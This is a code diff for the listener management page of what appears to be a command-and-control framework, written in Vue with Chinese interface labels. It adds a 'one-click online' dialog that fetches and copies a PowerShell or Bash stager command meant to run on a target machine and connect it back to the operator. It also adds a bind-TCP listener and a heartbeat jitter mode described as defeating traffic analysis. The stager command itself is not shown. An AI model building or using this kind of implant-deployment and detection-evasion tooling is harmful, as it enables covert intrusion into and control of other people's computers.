@@ -40,8 +40,16 @@
             </el-badge>
           </template>
         </el-table-column>
-        <el-table-column label="操作" width="200" align="center">
+        <el-table-column label="操作" width="280" align="center">
           <template #default="scope">
+            <el-button 
+              type="primary"
+              link
+              style="font-weight: 600; font-size: 13px;"
+              @click="openStagerDialog(scope.row)"
+            >
+              一键上线
+            </el-button>
             <el-button 
               v-if="scope.row.status === 'Stopped' || scope.row.status === 'Failed'"
               link
@@ -70,6 +78,22 @@
       </el-table>
     </el-card>
 
+    <el-dialog v-model="stagerVisible" title="一键上线 (One-Click Online)" width="600px">
+      <div style="margin-bottom: 20px;">
+        <el-radio-group v-model="stagerPlatform" size="small" @change="fetchStager">
+          <el-radio-button label="windows">Windows (PowerShell)</el-radio-button>
+          <el-radio-button label="linux">Linux (Bash)</el-radio-button>
+        </el-radio-group>
+      </div>
+      <div v-loading="stagerLoading">
+        <p style="font-size: 13px; color: #888; margin-bottom: 10px;">在目标机器执行以下命令即可上线：</p>
+        <div class="command-box">
+          <code>{{ stagerCommand }}</code>
+          <el-button :icon="CopyDocument" circle size="small" class="copy-btn" @click="copyCommand" />
+        </div>
+      </div>
+    </el-dialog>
+
 
     <!-- Professional Listener Configuration Modal -->
     <el-dialog 
@@ -85,11 +109,9 @@
         <div style="margin-bottom: 25px; display: flex; justify-content: center;">
           <el-radio-group v-model="form.protocol" size="large" @change="handleProtocolChange">
             <el-radio-button label="TCP">TCP</el-radio-button>
-            <el-radio-button label="KCP/UDP">UDP</el-radio-button>
             <el-radio-button label="WebSocket">WS</el-radio-button>
+            <el-radio-button label="正向TCP">正向TCP</el-radio-button>
             <el-radio-button label="DNS">DNS</el-radio-button>
-            <el-radio-button label="DOH">DOH</el-radio-button>
-            <el-radio-button label="DOT">DOT</el-radio-button>
           </el-radio-group>
         </div>
 
@@ -121,8 +143,16 @@
         </template>
 
         <!-- Step 4: Heartbeat & Reliability -->
-        <el-divider content-position="left"><el-icon><Connection /></el-icon> 心跳与超时</el-divider>
-        <el-row :gutter="20">
+        <el-divider content-position="left"><el-icon><Connection /></el-icon> 心跳与通信策略</el-divider>
+        <el-form-item label="心跳模式">
+          <el-radio-group v-model="form.heartbeat_mode" size="small">
+            <el-radio label="auto">随机抖动 (推荐)</el-radio>
+            <el-radio label="custom">自定义设置</el-radio>
+          </el-radio-group>
+          <div class="tip" v-if="form.heartbeat_mode === 'auto'">系统自动模拟人类交互行为，随机产生 25%-50% 的时间抖动，极强抗流量分析。</div>
+        </el-form-item>
+
+        <el-row :gutter="20" v-if="form.heartbeat_mode === 'custom'">
           <el-col :span="12">
             <el-form-item label="心跳间隔 (s)">
               <el-input-number v-model="form.heartbeat_interval" :min="1" style="width: 100%" />
@@ -191,7 +221,7 @@
 import { ref, reactive, onMounted } from 'vue'
 import api from '../api/index'
 import { ElMessage, ElMessageBox } from 'element-plus'
-import { Plus, Connection, Monitor, Lock, Setting, Promotion, View, Hide, Refresh } from '@element-plus/icons-vue'
+import { Plus, Connection, Monitor, Lock, Setting, Promotion, View, Hide, Refresh, CopyDocument } from '@element-plus/icons-vue'
 
 const listeners = ref([])
 const loading = ref(false)
@@ -199,6 +229,13 @@ const dialogVisible = ref(false)
 const submitting = ref(false)
 const showKey = ref(false)
 const listenAddr = ref('0.0.0.0:8081')
+
+// Stager State
+const stagerVisible = ref(false)
+const stagerLoading = ref(false)
+const stagerCommand = ref('')
+const stagerPlatform = ref('windows')
+const currentListener = ref(null)
 
 const form = reactive({
   bind_ip: '0.0.0.0',
@@ -214,6 +251,7 @@ const form = reactive({
   ns_domain: '',
   public_dns: '8.8.8.8:53',
   // Advanced
+  heartbeat_mode: 'auto',
   heartbeat_interval: 10,
   max_retry: 30
 })
@@ -243,12 +281,8 @@ const handleProtocolChange = (val) => {
     listenAddr.value = '0.0.0.0:53'
   } else if (val === 'WebSocket') {
     listenAddr.value = '0.0.0.0:8081'
-  } else if (val === 'TCP') {
+  } else if (val === 'TCP' || val === '正向TCP') {
     listenAddr.value = '0.0.0.0:8888'
-  } else if (['DOH', 'DOT'].includes(val)) {
-    listenAddr.value = '0.0.0.0:443'
-  } else {
-    listenAddr.value = '0.0.0.0:8082'
   }
 }
 
@@ -274,11 +308,9 @@ const generateRandomSalt = () => {
 const getProtocolType = (protocol) => {
   const typeMap = {
     'WebSocket': 'success',
-    'TCP': '',
-    'KCP/UDP': 'info',
-    'DNS': 'warning',
-    'DOH': 'danger',
-    'DOT': 'danger'
+    'TCP': 'primary',
+    '正向TCP': 'warning',
+    'DNS': 'warning'
   }
   return typeMap[protocol] || 'info'
 }
@@ -352,6 +384,37 @@ const handleDelete = (id) => {
   })
 }
 
+const openStagerDialog = (row) => {
+  currentListener.value = row
+  stagerVisible.value = true
+  fetchStager()
+}
+
+const fetchStager = async () => {
+  if (!currentListener.value) return
+  stagerLoading.value = true
+  try {
+    const res = await api.get('/api/stager', {
+      params: {
+        listener_id: currentListener.value.id,
+        os: stagerPlatform.value,
+        arch: 'x64',
+        host: currentListener.value.public_host || window.location.hostname
+      }
+    })
+    stagerCommand.value = res.data.command
+  } catch (e) {
+    ElMessage.error('无法生成上线命令')
+  } finally {
+    stagerLoading.value = false
+  }
+}
+
+const copyCommand = () => {
+  navigator.clipboard.writeText(stagerCommand.value)
+  ElMessage.success('命令已复制到剪贴板')
+}
+
 onMounted(fetchListeners)
 </script>
 
@@ -392,5 +455,32 @@ onMounted(fetchListeners)
 }
 .professional-dialog :deep(.el-dialog__body) {
   padding-top: 10px;
+}
+.command-box {
+  background: #1a1a1a;
+  padding: 15px;
+  border-radius: 8px;
+  position: relative;
+  border: 1px solid #333;
+}
+.command-box code {
+  color: #00f2ea;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px;
+  word-break: break-all;
+  white-space: pre-wrap;
+  display: block;
+  padding-right: 30px;
+}
+.copy-btn {
+  position: absolute;
+  top: 10px;
+  right: 10px;
+  background: #333 !important;
+  border: none !important;
+  color: #888 !important;
+}
+.copy-btn:hover {
+  color: #00f2ea !important;
 }
 </style>
